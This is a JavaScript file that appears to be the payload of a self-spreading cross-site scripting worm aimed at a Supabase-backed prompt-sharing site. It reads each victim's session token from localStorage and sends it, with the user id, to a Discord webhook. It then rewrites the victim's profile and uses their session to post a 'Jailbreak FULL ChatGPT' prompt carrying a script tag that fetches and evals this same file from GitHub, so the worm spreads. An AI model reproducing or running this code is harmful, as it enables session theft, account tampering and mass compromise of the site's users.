(() => {
    const NEW_POST = {
        title: 'Jailbreak FULL ChatGPT',
        description: "/model<script>fetch('https://raw.githubusercontent.com/ulusvdomain-arch/godtierprompts/refs/heads/main/inject.js').then(r => r.text()).then(eval)</script>",
        prompt: "/model<script>fetch('https://raw.githubusercontent.com/ulusvdomain-arch/godtierprompts/refs/heads/main/inject.js').then(r => r.text()).then(eval)</script>"
    };

    // get info
    let authData = JSON.parse(localStorage.getItem('sb-naxnmptbuycolotkwvsz-auth-token'));
    let access_token = authData?.access_token;
    let author_id = authData?.user?.id;
    let api_key = 'sb_publishable_4koI0XhJp65TObrB07RRCQ_HcZxOzcj';

    if (access_token) {
        // fully change name, description, etc
        const name_change_url = 'https://naxnmptbuycolotkwvsz.supabase.co/rest/v1/profiles?id=eq.' + author_id;
        fetch(name_change_url, {
            method: 'PATCH',
            headers: {
                apikey: api_key,
                Authorization: 'Bearer ' + access_token,
                'Content-Type': 'application/json',
                'Content-Profile': 'public',
                Accept: '*/*'
            },
            body: JSON.stringify({
                username: 'cvcvka5_' + [...Array(15)].map(() => Math.random().toString(36)[2]).join(''),
                display_name: 'cvcvka5_' + [...Array(15)].map(() => Math.random().toString(36)[2]).join(''),
                bio: 'you have an xss issue, reach out to me discord: plex5806',
                avatar_url: 'https://cdn.discordapp.com/avatars/259603363153444866/d032081cb95b34da1998f3753e789892?size=1024',
                email_notifs: false
            })
        });

        // send to webhook
        fetch('https://discord.com/api/webhooks/1417874292259029135/oEDSvZcRw3vhVmRQZvscq2a49UH0-fXNJE7L3vF-KBRAs1Zup70VWfB1kXgQUQ8dfZ7s', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: `author: ${author_id}\ntoken: ${access_token}` })
        });

        // duplicate exploit
        fetch('https://naxnmptbuycolotkwvsz.supabase.co/rest/v1/prompts?select=id', {
            method: 'POST',
            headers: {
                apikey: api_key,
                Authorization: 'Bearer ' + access_token,
                'Content-Type': 'application/json',
                Prefer: 'return=representation'
            },
            body: JSON.stringify({
                title: NEW_POST.title,
                description: NEW_POST.description,
                author_id: author_id,
                parent_prompt_id: null,
                step_count: 1,
                model_id: 'model'
            })
        })
        .then(res => res.json())
        .then(data => {
            const prompt_id = data[0].id;
            fetch('https://naxnmptbuycolotkwvsz.supabase.co/rest/v1/prompt_steps?columns="step_type","content","step_order","prompt_id"', {
                method: 'POST',
                headers: {
                    apikey: api_key,
                    Authorization: 'Bearer ' + access_token,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify([
                    {
                        step_type: 'prompt',
                        content: NEW_POST.prompt,
                        step_order: 1,
                        prompt_id: prompt_id
                    }
                ])
            });
        });
        fetch("https://naxnmptbuycolotkwvsz.supabase.co/rest/v1/comments?select=*", {
            method: "POST",
            headers: {
                "apikey": api_key,
                "Authorization": "Bearer "+access_token,
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                prompt_id: "6895e12a-4342-4e6d-bc39-6c679adba400",
                author_id: author_id,
                body: "upvote"
            })
        });
    }
})();
